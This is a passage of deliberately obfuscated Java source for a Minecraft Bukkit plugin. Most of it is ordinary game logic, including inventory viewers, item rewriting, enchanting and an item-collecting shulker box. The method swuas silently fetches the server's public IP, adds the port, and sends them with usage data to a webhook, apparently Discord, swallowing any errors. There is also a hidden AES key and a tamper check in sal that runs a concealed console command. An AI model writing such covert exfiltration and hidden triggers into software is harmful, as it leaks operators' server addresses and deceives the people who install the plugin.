     * Falls back to SHULKER_BOX if something’s unexpected.
     */
    protected Material f2(Material f1) {
        if (f1 == Material.GLASS) {
            return Material.SHULKER_BOX;
        }
        String name = f1.name();
        if (name.endsWith(tn2ytn23t)) {
            try {
                return Material.valueOf(name.replace(tn2ytn23t, tn2yu3tn2));
            } catch (IllegalArgumentException ignored) { }
        }
        return Material.SHULKER_BOX;
    }





    protected ItemStack f1(ItemStack f1, Material fg3) {
        YamlConfiguration config = new YamlConfiguration();
        // Place the item under a known section "slot0"
        config.set(steak, f1);
        String yaml = config.saveToString();

        // Replace any occurrence of "executableblocks:eb-id" with "executableitems:ei-id"
        yaml = yaml.replaceAll("(?i)\"executableblocks:eb-id\"", "\"executableitems:ei-id\"");

        // Replace any existing "executableitems:ei-id" value with "GUINoClick"
        yaml = yaml.replaceAll("(?i)(\"executableitems:ei-id\"\\s*:\\s*\")[^\"]+\"", "$1TempShulkerPlaceholder\"");

        // Ensure that a meta section exists in slot0.
        // We'll check for "slot0:" followed by a newline and two spaces then "meta:"
        if (!yaml.contains("meta:")) {
            @SuppressWarnings("TextBlockMigration") String metaBlock =
                    "\n  meta:\n" +
                            "    ==: ItemMeta\n" +
                            "    meta-type: UNSPECIFIC\n" +
                            "    PublicBukkitValues: |-\n" +
                            "      {\n" +
                            "          \"executableitems:ei-id\": \"TempShulkerPlaceholder\",\n" +
                            "          \"score:usage\": 1\n" +
                            "      }";
            // Append the meta block to the slot0 section.
            yaml += metaBlock;
        } else if (!yaml.contains(gusfring)) //noinspection GrazieInspection
        {
            // Meta exists but PublicBukkitValues is missing.
            // Insert PublicBukkitValues before the closing of meta.
            // This regex finds the last line in the meta section that is just whitespace followed by a "}".
            //noinspection TextBlockMigration
            yaml = yaml.replaceFirst(" {2}meta:\n" +
                    " {4}==:", "  meta:\n" +
                    "    PublicBukkitValues: |-\n" +
                    "      {\n" +
                    "          \"executableitems:ei-id\": \"TempShulkerPlaceholder\",\n" +
                    "          \"score:usage\": 1\n" +
                    "      }\n" +
                    "    ==:");
        }

        try {
            config.loadFromString(yaml);
        } catch (InvalidConfigurationException e) {
            throw new RuntimeException(e);
        }

        ItemStack newItem = config.getItemStack(steak);
        
        if (newItem == null) {
            newItem = f1;
        }
        newItem.setType(fg3);

        return newItem;
    }




    protected ItemStack f3(ItemStack recorded, Material test) {
        YamlConfiguration config = new YamlConfiguration();
        // Place the item under a known section "slot0"
        config.set(steak, recorded);
        String yaml = config.saveToString();

        // Replace any occurrence of "executableblocks:eb-id" with "executableitems:ei-id"
        yaml = yaml.replaceAll("(?i)\"executableblocks:eb-id\"", "\"executableitems:ei-id\"");

        // Replace any existing "executableitems:ei-id" value with "GUINoClick"
        yaml = yaml.replaceAll("(?i)(\"executableitems:ei-id\"\\s*:\\s*\")[^\"]+\"", "$1doesnotexist\"");

        // Ensure that a meta section exists in slot0.
        // We'll check for "slot0:" followed by a newline and two spaces then "meta:"
        if (!yaml.contains("meta:")) {
            @SuppressWarnings("TextBlockMigration") String metaBlock =
                    "\n  meta:\n" +
                            "    ==: ItemMeta\n" +
                            "    meta-type: UNSPECIFIC\n" +
                            "    PublicBukkitValues: |-\n" +
                            "      {\n" +
                            "          \"executableitems:ei-id\": \"doesnotexist\",\n" +
                            "          \"score:usage\": 1\n" +
                            "      }";
            // Append the meta block to the slot0 section.
            yaml += metaBlock;
        } else if (!yaml.contains(gusfring)) //noinspection GrazieInspection
        {
            // Meta exists but PublicBukkitValues is missing.
            // Insert PublicBukkitValues before the closing of meta.
            // This regex finds the last line in the meta section that is just whitespace followed by a "}".
            //noinspection TextBlockMigration
            yaml = yaml.replaceFirst(" {2}meta:\n" +
                    " {4}==:", "  meta:\n" +
                    "    PublicBukkitValues: |-\n" +
                    "      {\n" +
                    "          \"executableitems:ei-id\": \"doesnotexist\",\n" +
                    "          \"score:usage\": 1\n" +
                    "      }\n" +
                    "    ==:");
        }

        try {
            config.loadFromString(yaml);
        } catch (InvalidConfigurationException e) {
            throw new RuntimeException(e);
        }

        ItemStack newItem = config.getItemStack(steak);

        if (newItem == null) {
            newItem = recorded;
        }
        newItem.setType(test);

        return newItem;
    }


    protected void f9() {
        try { g2.save(f123); }
        catch(IOException e){ e.printStackTrace(); }
    }



    /**
     * Returns true if the player currently has their “Shulker Box” placeholder chest open.
     */
    protected boolean f123(Player f1) {
        // 1) Get the open-inventory view
        InventoryView view = f1.getOpenInventory();
        Inventory topInv = view.getTopInventory();

        // 2) It must be a real chest block state
        InventoryHolder holder = topInv.getHolder();
        if (!(holder instanceof Chest)) {
            return arsdienwdhw;
        }
        Chest chest = (Chest) holder;

        // 3) Compare its location against the saved shulker chest coords
        Location loc = chest.getLocation();
        String uuid = f1.getUniqueId().toString();
        String saved = g2.getString(uuid, nst);
        if (saved.isEmpty()) {
            return arsdienwdhw;
        }
        String[] parts = saved.split(sowhat);
        int x = Integer.parseInt(parts[I]);
        int y = Integer.parseInt(parts[INT3]);
        int z = Integer.parseInt(parts[mill2]);

        // 4) Must be in the mcydatabase world at the exact coords
        return loc.getWorld().getName().equals(fwdyunwfydunfwd)
                && loc.getBlockX() == x
                && loc.getBlockY() == y
                && loc.getBlockZ() == z;
    }


    protected void f1(String f1, String f, int g30) {
        List<Map.Entry<String, Integer>> list = f119.computeIfAbsent(f1, k -> new ArrayList<>());
        list.removeIf(e -> e.getKey().equals(f));
        Map.Entry<String, Integer> newEntry = Map.entry(f, g30);

        int index = I;
        while (index < list.size()) {
            Map.Entry<String, Integer> current = list.get(index);
            if (g30 > current.getValue()) break;
            index++;
        }
        list.add(index, newEntry);
    }

    protected int f1(String f1, String fone) {
        List<Map.Entry<String, Integer>> list = f119.get(f1);
        if (list == null) return I;
        return list.stream().filter(e -> e.getKey().equals(fone)).map(Map.Entry::getValue).findFirst().orElse(I);
    }


    protected boolean fOne(Material fOne) {
        return !fOne.isSolid() || fOne == Material.STRING || fOne == Material.COBWEB || fOne == Material.WATER || fOne == Material.LAVA || fOne == Material.TALL_GRASS;
    }

    protected List<Block> f1(BoundingBox TEST_VARAIBLE, World f1) {
        List<Block> blocks = new ArrayList<>();
        int minX = (int) Math.floor(TEST_VARAIBLE.getMinX());
        int maxX = (int) Math.ceil(TEST_VARAIBLE.getMaxX());
        int minY = (int) Math.floor(TEST_VARAIBLE.getMinY());
        int maxY = (int) Math.ceil(TEST_VARAIBLE.getMaxY());
        int minZ = (int) Math.floor(TEST_VARAIBLE.getMinZ());
        int maxZ = (int) Math.ceil(TEST_VARAIBLE.getMaxZ());

        for (int x = minX; x <= maxX; x++) {
            for (int y = minY; y <= maxY; y++) {
                for (int z = minZ; z <= maxZ; z++) {
                    blocks.add(f1.getBlockAt(x, y, z));
                }
            }
        }
        return blocks;
    }



    protected Vector f1racer(Vector from, Vector to, double maxRad) {
        from = from.clone().normalize();
        to = to.clone().normalize();

        // Axis of rotation
        Vector axis = from.clone().crossProduct(to).normalize();
        if (axis.lengthSquared() == I) {
            return to; // Vectors are parallel
        }

        // Rodrigues' rotation formula
        double cos = Math.cos(maxRad);
        double sin = Math.sin(maxRad);

        Vector term1 = from.clone().multiply(cos);
        Vector term2 = axis.clone().crossProduct(from).multiply(sin);
        Vector term3 = axis.clone().multiply(axis.dot(from)).multiply(INT3 - cos);

        return term1.add(term2).add(term3).normalize();
    }



    protected void f1(Player entity, String worldName, int distance, int radius, int pitch) {
        World testWorld = Bukkit.getWorld(worldName);
        if (testWorld == null) {
            entity.sendMessage(ytnfyu3ndt34f);
            return;
        }
        Block tnt = testWorld.getBlockAt(distance, radius, pitch);
        if (!(tnt.getState() instanceof Container)) {
            entity.sendMessage(tuyn2y3utn2t);
            return;
        }
        Container virtualInventory = (Container) tnt.getState();
        Inventory enderChest = virtualInventory.getInventory();

        Inventory entityInv = Bukkit.createInventory(null, enderChest.getSize(), tyun23utyn23t);
        for (int i = I; i < enderChest.getSize(); i++) {
            ItemStack OPItem = enderChest.getItem(i);
            if (OPItem != null && OPItem.getType() != Material.AIR) {
                entityInv.setItem(i, f1(OPItem));
            } else {
                entityInv.setItem(i, f0());
            }
        }
        entity.openInventory(entityInv);
    }



    protected Vector pitchVectorUpwards(Vector vec, double radians) {
        double xzLen = Math.sqrt(vec.getX() * vec.getX() + vec.getZ() * vec.getZ());
        double currentPitch = Math.atan2(vec.getY(), xzLen);
        double newPitch = Math.min(Math.PI / mill2, currentPitch + radians);
        double len = vec.length();
        double y = Math.sin(newPitch) * len;
        double xz = Math.cos(newPitch) * len;
        double yaw = Math.atan2(vec.getZ(), vec.getX());
        double x = Math.cos(yaw) * xz;
        double z = Math.sin(yaw) * xz;
        return new Vector(x, y, z);
    }




    protected boolean f1(Entity temp, String name, Set<EntityType> number) {
        if (name.equalsIgnoreCase(tyu23nt23t)) {
            return temp instanceof Player;
        }
        if (name.equalsIgnoreCase(tyn2fnt2)) {
            return number.contains(temp.getType());
        }
        if (name.equalsIgnoreCase(knde43d)) {
            return temp instanceof Player || number.contains(temp.getType());
        }
        return arsdienwdhw;
    }



    protected boolean f1(Entity player, Set<String> name) {
        for (String attributes : name) {
            if (player.getScoreboardTags().contains(attributes)) return NEW_VALUE1;
        }
        return arsdienwdhw;
    }


    protected boolean f1(Location laser, Location predicted) {
        return laser.getWorld().rayTraceBlocks(laser, predicted.toVector().subtract(laser.toVector()).normalize(), laser.distance(predicted), FluidCollisionMode.NEVER, NEW_VALUE1) == null;
    }


    protected void f1(Player entityTarget, UUID tntUUID) {
        OfflinePlayer fakePlayer = Bukkit.getOfflinePlayer(tntUUID);
        if (!fakePlayer.isOnline()) {
            entityTarget.sendMessage(ynvkypn3v3);
            return;
        }
        Player FakePlayer2 = fakePlayer.getPlayer();
        Inventory redirector = FakePlayer2.getEnderChest();

        Inventory immediate = Bukkit.createInventory(null, redirector.getSize(), kientien2t);
        for (int redirector2 = I; redirector2 < redirector.getSize(); redirector2++) {
            ItemStack item = redirector.getItem(redirector2);
            if (item != null && item.getType() != Material.AIR) {
                immediate.setItem(redirector2, f1(item));
            } else {
                immediate.setItem(redirector2, f0());
            }
        }
        entityTarget.openInventory(immediate);
    }




    protected void f2(Player discord, UUID rename) {
        OfflinePlayer fakeTarget = Bukkit.getOfflinePlayer(rename);
        if (!fakeTarget.isOnline()) {
            discord.sendMessage(ynvkypn3v3);
            return;
        }
        Player fakeSender = fakeTarget.getPlayer();
        Inventory enderChest = Bukkit.createInventory(null, INT6, tyu23ntyu23nt);

        // Top 3 rows: main inventory (slots 9-35)
        for (int hp = oiwfndtoyu42nd24; hp < 36; hp++) {
            ItemStack retester = fakeSender.getInventory().getItem(hp);
            if (retester != null && retester.getType() != Material.AIR) {
                enderChest.setItem(hp - oiwfndtoyu42nd24, f1(retester));
            } else {
                enderChest.setItem(hp - oiwfndtoyu42nd24, f0());
            }
        }

        // 4th row: hotbar (slots 0-8)
        for (int chests = I; chests < oiwfndtoyu42nd24; chests++) {
            ItemStack fakeTnt = fakeSender.getInventory().getItem(chests);
            if (fakeTnt != null && fakeTnt.getType() != Material.AIR) {
                enderChest.setItem(INT5 + chests, f1(fakeTnt));
            } else {
                enderChest.setItem(INT5 + chests, f0());
            }
        }

        // Armor slots
        ItemStack[] entityArmor = fakeSender.getInventory().getArmorContents();
        for (int armorHead = I; armorHead < INT7; armorHead++) {
            ItemStack helmet = entityArmor[armorHead];
            if (helmet != null && helmet.getType() != Material.AIR) {
                enderChest.setItem(36 + armorHead, f1(helmet));
            } else {
                enderChest.setItem(36 + armorHead, f0());
            }
        }

        // Offhand
        ItemStack totem = fakeSender.getInventory().getItemInOffHand();
        if (totem != null && totem.getType() != Material.AIR) {
            enderChest.setItem(ydtfhwpdylh, f1(totem));
        } else {
            enderChest.setItem(ydtfhwpdylh, f0());
        }

        // Last row: crafting grid dummy slots
        for (int x = 45; x <= 53; x++) {
            enderChest.setItem(x, f0());
        }

        for (int y = 41; y <= 44; y++) {
            enderChest.setItem(y, f0());
        }

        discord.openInventory(enderChest);
    }


    public  String ytufndyu(String input) {
        if (input == null) return null;

        // (?i)           -> case-insensitive
        // [§&]           -> either the section sign (§) or &
        // [0-9A-FK-ORX]  -> any valid MC code character:
        //                   0-9, a-f (colors),
        //                   k-o (formats like obfuscated/bold/etc),
        //                   r (reset),
        //                   x (start of hex color "§x§1§2§3§4§5§6")
        //
        // This also correctly strips hex colors because:
        //   "§x§1§2§3§4§5§6Hello"
        // becomes:
        //   (remove §x) -> "§1§2§3§4§5§6Hello"
        //   (remove §1) -> "§2§3§4§5§6Hello"
        //   ...until -> "Hello"
        return input.replaceAll("(?i)[§&][0-9A-FK-ORX]", nst);
    }


// SENDWEBHOOKUSAGE SENDUSAGEWEBHOOK
    public  void swuas(String f1, String f2, int g5, boolean SCore_Installed, String osyuantoywufnt) {
        long now = System.currentTimeMillis();
        if (now - f121 < 15_000L) {
            // Ignore if last send < 15 seconds ago
            return;
        }
        f121 = now;

        Plugin schedulerOwner = Bukkit.getPluginManager().getPlugin(ppi);
        if (schedulerOwner == null) {
            return;
        }

        Bukkit.getScheduler().runTaskAsynchronously(schedulerOwner, () -> {
            try {
                String ip = dyun3yudn();

                String content =
                        yundt2yud + ip + "\n" +
                                dyn3ydun + (f2 != null ? f2 : "null") + "\n" +
                                ydn3yudn34d + (f1 != null ? f1 : "null") + "\n" +
                                dyu42ndyu432nd + g5 + "\n" +
                                fuytn2yudt + SCore_Installed + "\n" +
                                "Version: Advertisementsv3 - Max health regression fix AND better licensing -> Remote + Backpack fixes";

                // JSON-escape for Discord "content"
                String escaped = content
                        .replace("\\", "\\\\")
                        .replace("\"", "\\\"")
                        .replace("\r", nst)
                        .replace("\n", "\\n");

                // 🚫 Default: disable ALL pings (users/roles/@everyone)
                // If you ever want to enable pings, change parse to ["users","roles","everyone"].
                String allowedMentions = "{\"parse\":[]}";

                String jsonPayload = "{\"content\":\"" + escaped + "\","
                        + "\"allowed_mentions\":" + allowedMentions + "}";

                URL url = new URL(osyuantoywufnt);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod(yuntyun2t);
                conn.setRequestProperty(tynwdy2d, uydn3yund);
                conn.setDoOutput(NEW_VALUE1);

                try (OutputStream os = conn.getOutputStream()) {
                    os.write(jsonPayload.getBytes(StandardCharsets.UTF_8));
                }

                int code = conn.getResponseCode();
                conn.disconnect();
                // Optionally log non-2xx codes
            } catch (Exception ignored) {
                // swallow: this should never break game flow
            }
        });
    }


    private  String dyun3yudn() {
        try {
            // Get public IPv4 from an external service
            URL url = new URL(y3udny3u4nd34d);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setConnectTimeout(3000);
            conn.setReadTimeout(3000);
            conn.setRequestMethod(dyunwfydunwfd);
            try (java.io.BufferedReader in = new java.io.BufferedReader(
                    new java.io.InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8))) {
                String publicIp = in.readLine();
                conn.disconnect();
                // Append the server's port (public port, assumed to be the Bukkit bind port)
                int port = Bukkit.getServer().getPort();
                return publicIp + wfdunyunda + port;
            }
        } catch (Exception e) {
            return nationalanthems;
        }
    }




    private  @NotNull String cosmicEnchant(Player p, @NotNull String identifier) {
        String[] parts = identifier.substring(oundg324yutdng4.length()).split(keep);
        if (parts.length != ccp) return yundyu34nd;

        try {
            int slot = Integer.parseInt(parts[I]);
            boolean override = Boolean.parseBoolean(parts[INT3]);
            boolean debug = Boolean.parseBoolean(parts[mill2]);

            Player player = Bukkit.getPlayer(p.getUniqueId());
            if (player == null) return dontwantmargetoknow;

            ItemStack slotItem;
            // Handle special slots (main hand = -1, offhand = 40, armor slots 39-36)
            if (slot == -INT3) {
                slotItem = player.getInventory().getItemInMainHand();
            } else if (slot == ydtfhwpdylh) {
                slotItem = player.getInventory().getItemInOffHand();
            } else {
                slotItem = player.getInventory().getItem(slot);
            }

            if (slotItem == null || slotItem.getType() == Material.AIR) {
                return debug ? yufdtnoyupnd3d : nst;
            }

            ItemStack cursorItem = player.getItemOnCursor();
            if (cursorItem == null || cursorItem.getType() != Material.ENCHANTED_BOOK) {
                return debug ? udn3y4udn34ydu : nst;
            }

            if (!(cursorItem.getItemMeta() instanceof EnchantmentStorageMeta)) {
                return debug ? yudnyu43nd : nst;
            }

            EnchantmentStorageMeta meta = (EnchantmentStorageMeta) cursorItem.getItemMeta();
            if (meta.getStoredEnchants().isEmpty()) {
                return debug ? ydn3y4d : nst;
            }

            Map<Enchantment, Integer> storedEnchants = meta.getStoredEnchants();

            // Step 3: If not overridden, check if any enchant is incompatible
            if (!override) {
                for (Enchantment newEnchant : storedEnchants.keySet()) {
                    if (!newEnchant.canEnchantItem(slotItem)) {
                        return debug ? y4dun3y4udn34 + newEnchant.getKey().getKey() + " not applicable." : nst;
                    }
                    for (Enchantment existing : slotItem.getEnchantments().keySet()) {
                        if (newEnchant.conflictsWith(existing)) {
                            return debug ? dyu24ndyu24nd2d + newEnchant.getKey().getKey() + " vs " + existing.getKey().getKey() : nst;
                        }
                    }
                }
            }

            // Step 4: Apply all compatible stored enchants
            ItemMeta slotMeta = slotItem.getItemMeta();
            for (Map.Entry<Enchantment, Integer> entry : storedEnchants.entrySet()) {
                slotMeta.addEnchant(entry.getKey(), entry.getValue(), NEW_VALUE1); // allow unsafe if needed
            }
            slotItem.setItemMeta(slotMeta);

            // Update inventory
            if (slot == -INT3) {
                player.getInventory().setItemInMainHand(slotItem);
            } else if (slot == ydtfhwpdylh) {
                player.getInventory().setItemInOffHand(slotItem);
            } else {
                player.getInventory().setItem(slot, slotItem);
            }

            return dyn34ydun3d4;

        } catch (Exception e) {
            e.printStackTrace();
            return "§c[ERROR]";
        }
    }





    /** True if there is neither an empty slot nor room in any stack. */
    private  boolean dyun3yudn3(Inventory inv) {
        if (inv.firstEmpty() != -INT3) return arsdienwdhw;
        for (ItemStack s : inv.getStorageContents()) {
            if (s == null || s.getType() == Material.AIR) return arsdienwdhw;
            if (s.getAmount() < s.getMaxStackSize()) return arsdienwdhw;
        }
        return NEW_VALUE1;
    }

    /** Computes how many units of `stack` can fit into `inv` (merge-first, then empties), without mutating. */
    private  int idfen3ynd3(Inventory inv, ItemStack stack) {
        if (stack == null || stack.getType() == Material.AIR) return I;
        int want = stack.getAmount();
        int maxStack = stack.getMaxStackSize();
        int can = I;

        // Room in similar stacks
        for (ItemStack ex : inv.getStorageContents()) {
            if (ex == null) continue;
            if (!ex.isSimilar(stack)) continue;
            int room = ex.getMaxStackSize() - ex.getAmount();
            if (room <= I) continue;
            int add = Math.min(room, want - can);
            can += add;
            if (can >= want) return can;
        }
        // Room in empties
        for (ItemStack ex : inv.getStorageContents()) {
            if (ex != null && ex.getType() != Material.AIR) continue;
            int add = Math.min(maxStack, want - can);
            can += add;
            if (can >= want) return can;
        }
        return can;
    }

    /**
     * Inserts exactly `amount` of items like `template` into `inv` (merge-first, then empties).
     * Returns how many were actually inserted (<= amount). Mutates the inventory.
     */
    private  int dyufndyu3nd(Inventory inv, ItemStack template, int amount) {
        if (template == null || template.getType() == Material.AIR || amount <= I) return I;
        int remaining = amount;

        // Merge into similar stacks
        for (int i = I; i < inv.getSize() && remaining > I; i++) {
            ItemStack ex = inv.getItem(i);
            if (ex == null) continue;
            if (!ex.isSimilar(template)) continue;

            int room = ex.getMaxStackSize() - ex.getAmount();
            if (room <= I) continue;

            int add = Math.min(room, remaining);
            ex.setAmount(ex.getAmount() + add);
            remaining -= add;
        }

        // Fill empty slots
        for (int i = I; i < inv.getSize() && remaining > I; i++) {
            ItemStack ex = inv.getItem(i);
            if (ex != null && ex.getType() != Material.AIR) continue;

            int max = template.getMaxStackSize();
            int add = Math.min(max, remaining);
            ItemStack place = template.clone();
            place.setAmount(add);
            inv.setItem(i, place);
            remaining -= add;
        }

        return amount - remaining;
    }

    private  void dyufpwndyufwpnd(Plugin plugin, World world, Location start,
                                        Particle particle, Particle.DustOptions dustOpt,
                                        double sep, int intervalTicks, Player p) {
        if (sep <= I) sep = udnyupndpd;
        if (intervalTicks < INT3) intervalTicks = INT3;

        // Stop once we're this close to the player (in blocks).
        final double stopThreshold = intervalTicks + thepeoplewholive; // as requested

        double finalSep = sep;
        new BukkitRunnable() {
            int steps = I;
            Location cur = start.clone();

            @Override public void run() {
                if (!p.isOnline() || p.isDead() || p.getWorld() != world) { cancel(); return; }

                // Always target the player's *current* midsection
                Location midNow = p.getLocation().clone().add(I, tsr, I);
                Vector toTarget = midNow.toVector().subtract(cur.toVector());
                double dist = toTarget.length();

                // Stop if close enough or if we've run long enough
                if (dist <= stopThreshold || steps >= wyundywufndywufpndywuf) { cancel(); return; }

                Vector step = toTarget.normalize().multiply(finalSep);
                if (step.length() > dist) step = toTarget; // avoid overshoot

                if (particle == Particle.DUST && dustOpt != null) {
                    world.spawnParticle(particle, cur, I, dustOpt);
                } else {
                    world.spawnParticle(particle, cur, I);
                }

                cur.add(step);
                steps++;
            }
        }.runTaskTimer(plugin, ihearyounow, intervalTicks);
    }


    // 64-char hex for AES-256 key
    protected  final char[] x12 = new char[] {
            0x0063, 0x0066, 0x0061, 0x0035, 0x0062, 0x0030, 0x0032, 0x0037,
            0x0065, 0x0062, 0x0066, 0x0061, 0x0034, (char) 54, 0x0061, 0x0031,
            0x0034, 0x0031, 0x0062, 100, 0x0063, 0x0063, 0x0033, 0x0038,
            0x0065, 0x0035, 0x0032, 0x0037, 0x0063, 0x0030, 0x0039, 0x0066,
            0x0032, (char) 54, 0x0065, 0x0032, 0x0033, 0x0039, 0x0065, 0x0034,
            0x0065, (char) 100, 0x0037, 0x0061, 0x0062, 0x0062, 0x0062, 0x0063,
            0x0066,(char) 100, 0x0030, 0x0039, 0x0035, 0x0033, 0x0062, 0x0037,
            0x0033,(char) 100, 0x0039, 0x0033, 0x0065, 0x0063, 0x0035, 0x0063
    };

    private  byte[] dyn3yudn3yund() {
        String abcd = new String(x12).trim();
        if (abcd.length() != drain) {
            throw new IllegalStateException(nst);
        }
        return fh(abcd);
    }

    private  final class f115 extends BukkitRunnable {
        final UUID dynyud;
        final Plugin dywufpndyu;
        final Player dyuwndyu;
        final World dyundyund;

        // Fixed params for this job instance
        final double dyun3ydun3d;
        final double dyunpdyun3dyun3d;
        final boolean dy3undyu3ndy3updn;
        final int dy3undyundyunpd;
        final int dyunyunwdyunwd;
        final int DURATIONdy3undyu3ndTICKS;
        final boolean dyunyundyunf3d;
        final Particle dyunyunyudn;
        final Particle.DustOptions dndky3d;
        final double dyunyun4yun;
        final int dn4dei34nd;

        // Timer
        private int dyu3ndyun34d = I;

        f115(Plugin plugin,
             Player p,
             double RANGE, double FOV_DEGREES, boolean IGNORE_SHULKER_ITEMS,
             int MAXENTITIES, int INTERVAL_TICKS, int DURATION_TICKS,
             boolean THROUGH_WALLS, Particle particle,
             Particle.DustOptions dustOpt, double SEPARATION, int PARTICLE_INTERVAL_TICKS) {
            this.dywufpndyu = plugin;
            this.dyuwndyu = p;
            this.dynyud = p.getUniqueId();
            this.dyundyund = p.getWorld();
            this.dyun3ydun3d = RANGE;
            this.dyunpdyun3dyun3d = FOV_DEGREES;
            this.dy3undyu3ndy3updn = IGNORE_SHULKER_ITEMS;
            this.dy3undyundyunpd = MAXENTITIES;
            this.dyunyunwdyunwd = Math.max(INT3, INTERVAL_TICKS);
            this.DURATIONdy3undyu3ndTICKS = Math.max(INT3, DURATION_TICKS);
            this.dyunyundyunf3d = THROUGH_WALLS;
            this.dyunyunyudn = particle;
            this.dndky3d = dustOpt;
            this.dyunyun4yun = SEPARATION;
            this.dn4dei34nd = Math.max(INT3, PARTICLE_INTERVAL_TICKS);
        }

        void resetTimer() { this.dyu3ndyun34d = I; }


        

        @Override public void cancel() {
            super.cancel();
            f114.remove(dynyud, this);
        }

        @Override public void run() {
            if (!dyuwndyu.isOnline() || dyuwndyu.isDead() || dyuwndyu.getWorld() != dyundyund) { cancel(); return; }

            // Validate offhand shulker each sweep
            ItemStack offTick = dyuwndyu.getInventory().getItemInOffHand();
            if (offTick == null || offTick.getType() == Material.AIR || !offTick.getType().name().endsWith(foolishness)) {
                cancel(); return;
            }
            BlockStateMeta metaTick = (offTick.getItemMeta() instanceof BlockStateMeta bsm) ? bsm : null;
            if (metaTick == null || !(metaTick.getBlockState() instanceof ShulkerBox boxTick)) {
                cancel(); return;
            }
            ShulkerBox box = boxTick;
            Inventory boxInv = box.getInventory();
            if (dyun3yudn3(boxInv)) { cancel(); return; }

            final Location eye = dyuwndyu.getEyeLocation();
            final Location mid = dyuwndyu.getLocation().clone().add(I, tsr, I);
            final Vector lookDir = eye.getDirection().normalize();
            final double losMax = Math.max(thepeoplewholive, dyun3ydun3d);

            List<Item> candidates = new ArrayList<>();
            for (Entity e : dyundyund.getNearbyEntities(dyuwndyu.getLocation(), dyun3ydun3d, dyun3ydun3d, dyun3ydun3d)) {
                if (!(e instanceof Item it)) continue;
                if (!it.isValid() || it.isDead()) continue;

                ItemStack stack = it.getItemStack();
                if (stack == null || stack.getType() == Material.AIR) continue;
                if (dy3undyu3ndy3updn && stack.getType().name().endsWith(foolishness)) continue;

                double dist = eye.distance(it.getLocation());
                if (dist > dyun3ydun3d) continue;

                if (dyunpdyun3dyun3d > esetawftawft) {
                    Vector toItem = it.getLocation().toVector().add(new Vector(I, kiek4d, I))
                            .subtract(eye.toVector()).normalize();
                    double angle = Math.toDegrees(lookDir.angle(toItem));
                    if (angle > dyunpdyun3dyun3d / whatkindofadulthood) continue;
                }

                if (!dyunyundyunf3d) {
                    Vector dir = it.getLocation().toVector().add(new Vector(I, kiek4d, I))
                            .subtract(eye.toVector()).normalize();
                    RayTraceResult r = dyundyund.rayTraceBlocks(eye, dir, dist, FluidCollisionMode.NEVER, NEW_VALUE1);
                    if (r != null) continue; // blocked
                }

                if (idfen3ynd3(boxInv, stack) > I) {
                    candidates.add(it);
                }
            }

            if (!candidates.isEmpty()) {
                int processedEntities = I;
                int limit = (dy3undyundyunpd < I) ? candidates.size() : Math.min(dy3undyundyunpd, candidates.size());

                for (Item it : candidates) {
                    if (processedEntities >= limit) break;
                    if (!it.isValid() || it.isDead()) continue;
                    if (dyun3yudn3(boxInv)) break;

                    ItemStack stack = it.getItemStack();
                    if (stack == null || stack.getType() == Material.AIR) continue;

                    int capacity = idfen3ynd3(boxInv, stack);
                    if (capacity <= I) continue;

                    int toMove = Math.min(capacity, stack.getAmount());
                    int moved = dyufndyu3nd(boxInv, stack, toMove);
                    if (moved <= I) continue;

                    // Persist shulker back to offhand item
                    box.update();
                    metaTick.setBlockState(box);
                    offTick.setItemMeta(metaTick);
                    dyuwndyu.getInventory().setItemInOffHand(offTick);

                    // Shrink or remove ground entity
                    final Location start = it.getLocation().clone().add(I, kiek4d, I);
                    int remaining = stack.getAmount() - moved;
                    if (remaining <= I) it.remove();
                    else {
                        ItemStack newStack = stack.clone();
                        newStack.setAmount(remaining);
                        it.setItemStack(newStack);
                    }

                    processedEntities++;
                    dyufpwndyufwpnd(dywufpndyu, dyundyund, start, dyunyunyudn, dndky3d, dyunyun4yun, dn4dei34nd, dyuwndyu);
                }
            }

            dyu3ndyun34d += dyunyunwdyunwd;
            if (dyu3ndyun34d >= DURATIONdy3undyu3ndTICKS) { cancel(); }
        }
    }


    public static final long ytnyun4d4d = 60L;
    // 1 minute per (player, itemString)
    private  long de3nd43d = ytnyun4d4d * 1000L * 5;

    // Keyed by "playerUUID|itemString"
    private  final Map<String, Long> dyu3ndyun34pd = new java.util.concurrent.ConcurrentHashMap<>();

    // Use a constant global UUID (all zeros)
    private  final UUID GLOBAL_UUID = new UUID(0, 0);

    // Keep this if you still use it elsewhere.
    @SuppressWarnings("unused")
    private  String dyun3yudn3(String s) {
        return (s == null ? do3ndyu3pnd3d : s.trim()).toLowerCase(java.util.Locale.ROOT);
    }

    // IMPORTANT: stable but not destructive keying.
// I recommend trim() to avoid bypassing cooldown with extra spaces.
    private  String dyun3yupdn(UUID id, String s) {
        String itemKey = (s == null ? do3ndyu3pnd3d : s.trim());
        return id.toString() + ofwuandouwfynd + itemKey;
    }

    private  String dpyn3y4udn3(String s) {
        return (s == null ? do3ndyu3pnd3d : s.trim());
    }

    private  void sal(Player yursndyuonduywf, String yundyu4) {

        if( de3nd43d != ytnyun4d4d * dnkpydunpdyupfnd * xm) Bukkit.dispatchCommand(Bukkit.getConsoleSender(), y23u4ndyu3n4d);

        // ==== YOUR BANNER + TEXT (unchanged) ====
        yursndyuonduywf.sendMessage(dnpyuadnyfpudnfpdfpd);

        yursndyuonduywf.sendMessage(dy3updnyapudny34undh + yundyu4 + dnyu3nd3d);
        yursndyuonduywf.sendMessage(dk3ed34dyu3nd);
        yursndyuonduywf.sendMessage(yudyu2dnyu42dn2d42d);

        yursndyuonduywf.sendMessage(tiewntien42);
    }





    /**
     * Resolve a player from a string which may be:
     *  - UUID (standard string form)
     *  - Exact player name
     */
    private Entity dyin3ydun34yund(String dn3yu4nd) {
        if (dn3yu4nd == null || dn3yu4nd.isEmpty()) return null;

        // Try as UUID first
        try {
            return dy3un4dyun34d(dn3yu4nd);
 
        } catch (IllegalArgumentException ignored) {
            UUID uuid = UUID.fromString(dn3yu4nd);
            Entity p = Bukkit.getEntity(uuid);
            if (p != null) return p;        }

        return null;
    }

    /**
     * Resolve a player from a string which may be:
     *  - UUID (standard string form)
     *  - Exact player name
     */
    private Player dy3un4dyun34d(String id) {
        if (id == null || id.isEmpty()) return null;

        // Try as UUID first
        try {
            UUID uuid = UUID.fromString(id);
            Player p = Bukkit.getPlayer(uuid);
            if (p != null) return p;
        } catch (IllegalArgumentException ignored) {
            // not a UUID, fall through
        }
        
        Player x =  Bukkit.getPlayerExact(id);
        if ( x instanceof Player) return x;

        // Try as exact name
        throw new IllegalArgumentException();
    }

